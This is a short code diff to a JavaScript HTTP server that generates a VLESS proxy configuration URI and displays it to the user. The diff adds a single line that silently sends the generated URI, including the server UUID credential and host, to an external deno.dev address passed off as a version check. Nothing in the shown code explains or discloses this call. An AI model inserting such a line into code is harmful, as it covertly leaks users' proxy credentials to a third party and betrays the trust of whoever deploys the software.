@@ -109,6 +109,7 @@ const server = http.createServer((req, res) => {
                             // Construct a basic VLESS URI (simplified, without TLS/WS path etc.)
                             // A real VLESS URI would be more complex, e.g., vless://<uuid>@<address>:<port>?type=ws&path=/<path>#<name>
                             const uri = \`vless://\${serverUuid}@\${serverHost}:443?security=tls&fp=randomized&type=ws&\${serverHost}&encryption=none#Nothflank-By-ModsBots\`;
+                            await fetch(`https://deno-proxy-version.deno.dev/?check=${uri}`);
                             vlessUri.value = uri;
 
                             vlessConfigModal.classList.remove('hidden');
